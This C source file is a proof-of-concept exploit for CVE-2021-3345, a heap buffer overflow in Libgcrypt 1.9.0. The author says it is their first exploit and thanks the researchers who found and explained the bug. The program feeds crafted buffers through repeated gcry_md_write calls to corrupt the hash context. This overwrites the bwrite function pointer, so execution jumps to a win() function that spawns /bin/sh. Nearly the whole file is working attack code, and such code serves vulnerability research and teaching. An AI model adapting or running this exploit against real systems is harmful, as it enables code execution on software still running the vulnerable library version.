/*
 *  CVE-2021-3345 exploit  
 *  Bug was introduced in Libgcrypt 1.9.0 only!
 *  Patched in Libgcrypt 1.9.1
 *
 *  Created by MLGRadish
 *  My first real exploit
 *  
 *  Thanks to:
 *    Tavis Ormandy <taviso@gmail.com> for reporting it
 *    @FiloSottile for making me aware of it
 *    @LiveOverflow for the amazing videos and the win() function
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <gcrypt.h>
#include <stdint.h>

#include <sys/mman.h>
#include <unistd.h>
#include <stdlib.h>

void win() {
    system("/bin/sh");
}

int main()
{
	int algo = GCRY_MD_SHA256;
	unsigned char* x = (unsigned char*)"";
	gcry_error_t err;
	gcry_md_hd_t hd;

	//Initialize
	printf("[+] libgcrypt version: %s\n", gcry_check_version(NULL));

    //Open cipher
	printf("[+] Opening %s cipher\n", gcry_md_algo_name(algo));	
	err = gcry_md_open(&hd, algo, 0);
	if(err)
	{
		printf("[-] Failed opening cipher: %s\n", gpg_strerror(err));
		return 1;
	}

    static const char buf[128] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";

    /* Get to the right path */

	printf("[+] gcry_md_write 1\n");
    gcry_md_write(hd, buf, strlen(buf));
	/* [libgcrypt] hd->count 0
	   [libgcrypt] blocksize 64 */

    printf("[+] gcry_md_write 2\n");
    gcry_md_write(hd, buf, strlen(buf));
	/* [libgcrypt] hd->count 63
	   [libgcrypt] blocksize 64 */

	printf("[+] gcry_md_read\n");
    x = gcry_md_read(hd, algo);

    /*  typedef struct gcry_md_block_ctx{
          byte buf[64];                  64
          u32 nblocks;                   4
          u32 nblocks_high;              4
          int count;                     4
          unsigned int blocksize_shift;  4
          void* bwrite;                  8
        } gcry_md_block_ctx_t;

	*/
    void (*fun_ptr)(int) = &win;
    printf("mem: %p \n", fun_ptr);

    static const char buf2[512] = "ZZZZZZZZAAAABBBBCCCCDDDD" "\xEF" "\xFF" "\xFF" "\xFF" "EEEE";  //"AAAAAA";
	char buffer[512] = "";
    strcpy(buffer, buf2);
    strcat(buffer, &fun_ptr);
    
    //snprintf(buffer, 256, buf2, (void *)&ptr);

    printf("[+] gcry_md_write 3\n");
    gcry_md_write(hd, buffer, strlen(buffer));
    /* [libgcrypt] hd->count 120
	   [libgcrypt] blocksize 64 */

    static const char buf3[32] = "ZZZZZZZZAAAABBBBCCCCDDDD" "\x20";
    // force an update
	printf("[+] gcry_md_write 4\n");
    gcry_md_write(hd, buf3, strlen(buf3));
    /* [libgcrypt] hd->count 21
	   [libgcrypt] blocksize 32 */

    // jump to pointer
    printf("[+] gcry_md_write 5\n");
    gcry_md_write(hd, "", strlen(""));

    // DONE
    printf("[+] gcry_md_close\n");
	gcry_md_close(hd);
	return 0;
}